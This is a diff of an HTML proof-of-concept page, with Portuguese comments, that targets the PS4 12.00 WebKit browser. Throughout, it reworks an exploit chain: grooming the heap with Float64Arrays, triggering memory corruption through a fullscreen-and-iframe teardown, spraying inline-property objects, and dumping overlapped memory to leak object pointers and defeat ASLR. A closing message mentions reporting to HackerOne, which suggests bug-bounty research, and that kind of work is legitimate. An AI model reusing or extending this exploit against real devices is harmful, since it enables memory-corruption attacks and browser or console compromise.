@@ -2,33 +2,39 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 - Butterfly Overlap - Leandro</title>
+    <title>PS4 12.00 - Type Confusion (Inline Props)</title>
+    <style>
+        body { background-color: #f4f4f9; font-family: sans-serif; padding: 20px; }
+        button { padding: 12px; font-weight: bold; cursor: pointer; }
+        #leak-output { background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; line-height: 1.5; }
+    </style>
 </head>
-<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
+<body>
 
-    <h1>PS4 12.00 - InfoLeak (Butterfly)</h1>
+    <h1>PS4 12.00 - Inline Property Overlap</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (Butterfly Spray)</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Memory Dump</button>
+    <button onclick="prepareObjects()">1. Preparar Objetos (Float64 de 64 bytes)</button>
+    <button onclick="setupIframe()">2. Injetar Iframe (Gatilho Original)</button>
+    <button onclick="checkPersistence()" style="background-color: #c8e6c9;">3. Memory Dump</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; line-height: 1.6;"></div>
-
+    <div id="leak-output"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const PATTERN = 2.121995791e-314; // 0x4141414141414141
+        const PATTERN = 2.121995791e-314; // 0x41414141...
         let controllers = [];
         const statusPai = document.getElementById('status-pai');
         const leakOutput = document.getElementById('leak-output');
 
+        // ==========================================
+        // PASSO 1: A SUA BASE DE SUCESSO ORIGINAL
+        // ==========================================
         function prepareObjects() {
             controllers = [];
             for(let i = 0; i < 5000; i++) {
-                // A sua base de ouro (Tamanho 8)
-                let arr = new Float64Array(8);
+                let arr = new Float64Array(8); // Exatos 64 bytes
                 arr[0] = i; 
                 controllers.push(arr);
             }
@@ -37,12 +43,25 @@
             leakOutput.style.display = "none";
         }
 
+        // A estrutura mágica de 64 bytes
+        // Isso força o JIT a criar um StructureID denso
+        function LeakerObject() {
+            this.p0 = PATTERN;      // Âncora visual para acharmos no dump
+            this.p1 = document;     // Objeto DOM (VTable de C++)
+            this.p2 = window;       // Objeto Global
+            this.p3 = navigator;    // Objeto WebKit
+            this.p4 = 0x1337;       // Lixo detectável
+            this.p5 = 0x1337;
+        }
+
+        // ==========================================
+        // PASSO 2: O SEU GATILHO INTACTO
+        // ==========================================
         function setupIframe() {
             const container = document.getElementById('frame-container');
             container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
             
-            const frame = document.getElementById('pocFrame');
-            const fDoc = frame.contentWindow.document;
+            const fDoc = document.getElementById('pocFrame').contentWindow.document;
 
             fDoc.open();
             fDoc.write(`
@@ -50,6 +69,16 @@
                 <body>
                     <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                     <script>
+                        // Declarando o construtor dentro do iframe também
+                        function LeakerObject() {
+                            this.p0 = 2.121995791e-314; 
+                            this.p1 = document;
+                            this.p2 = window;
+                            this.p3 = navigator;
+                            this.p4 = 0x1337;
+                            this.p5 = 0x1337;
+                        }
+
                         window.startPoC = function() {
                             if (document.documentElement.webkitRequestFullscreen) 
                                 document.documentElement.webkitRequestFullscreen();
@@ -57,22 +86,12 @@
                             window.onblur = function() {
                                 let spray = [];
                                 
+                                // O Spray Perfeito: Instâncias da classe ocupando os buracos de 64 bytes
                                 for(let i = 0; i < 8000; i++) {
-                                    // A MÁGICA AQUI: Usamos JS Array normal em vez de Float64Array
-                                    // O índice 0 é o PATTERN para disparar a detecção.
-                                    // Os índices seguintes são OBJETOS REAIS do sistema!
-                                    let mixArray = [
-                                        ${PATTERN}, 
-                                        document,       // Ponteiro do DOM
-                                        window,         // Ponteiro Global
-                                        navigator,      // Ponteiro de sistema
-                                        new Uint32Array(1), // Objeto tipado
-                                        i, i, i         // Preenchimento numérico
-                                    ];
-                                    spray.push(mixArray);
+                                    spray.push(new LeakerObject());
                                 }
                                 
-                                // O seu timing exato de sucesso
+                                // O seu timing original
                                 setTimeout(() => {
                                     document.open();
                                     document.write('<h1>FINALIZADO</h1>');
@@ -88,12 +107,17 @@
             statusPai.innerText = "Iframe Pronto. Sequência: FS -> OPTIONS.";
         }
 
+        // ==========================================
+        // PASSO 3: O RADAR DE TYPE CONFUSION
+        // ==========================================
         function checkPersistence() {
             let corrupted = null;
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
+                // Se o ID original sumiu, fomos sobrepostos!
+                // Aqui não checamos apenas por PATTERN, porque o offset 0 agora será o JSCell Header!
+                if (controllers[i][0] !== i) {
                     corrupted = controllers[i];
                     corruptedIndex = i;
                     break;
@@ -101,9 +125,11 @@
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ BINGO! ID " + corruptedIndex + " corrompido!</span>";
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Type Confusion no ID " + corruptedIndex + "!</span>";
                 leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ MEMORY DUMP - BUSCA DE PONTEIROS ]</b><br><br>";
+                leakOutput.innerHTML = "<b>[ MEMORY DUMP - JSOBJECT ]</b><br><br>";
+
+                let achouPonteiro = false;
 
                 for(let i = 0; i < 8; i++) {
                     const val = corrupted[i];
@@ -111,20 +137,37 @@
                     new Float64Array(buf)[0] = val;
                     const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                     
-                    // Lógica para destacar ponteiros:
-                    // No WebKit, ponteiros de objetos frequentemente começam com algo como 0x0000... e não são zeros absolutos.
-                    let isPointer = (hex !== "0000000000000000" && !hex.includes("41414141"));
-                    let style = isPointer ? "color:#fff; background:#d32f2f; padding:2px; font-weight:bold;" : "";
-                    
                     let label = "";
-                    if (i === 0) label = " (Pattern)";
-                    else if (i === 1) label = " (Possível 'document')";
-                    else if (i === 2) label = " (Possível 'window')";
-                    
+                    let isPointer = false;
+
+                    // Offset 0: Cabeçalho (JSCell) -> Terá a Structure ID do WebKit
+                    if (i === 0) {
+                        label = " (JSCell Header - Structure ID)";
+                        isPointer = true;
+                    } 
+                    // Offset 1: Butterfly
+                    else if (i === 1) {
+                        label = " (Butterfly Ptr)";
+                    }
+                    // A partir do offset 2, começam as propriedades inline!
+                    else if (hex.includes("41414141")) {
+                        label = " (PATTERN Encontrado!)";
+                    }
+                    else if (hex !== "0000000000000000") {
+                        label = " (Ponteiro JSValue)";
+                        isPointer = true;
+                        achouPonteiro = true;
+                    }
+
+                    let style = isPointer ? "color:#fff; background:#a00; padding:2px;" : "";
                     leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span>" + label + "<br>";
                 }
+
+                if (achouPonteiro) {
+                    leakOutput.innerHTML += "<br><span style='color:yellow;'>Você quebrou o ASLR! Printa isso para o HackerOne.</span>";
+                }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente novamente.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente reiniciar.</span>";
             }
         }
     </script>
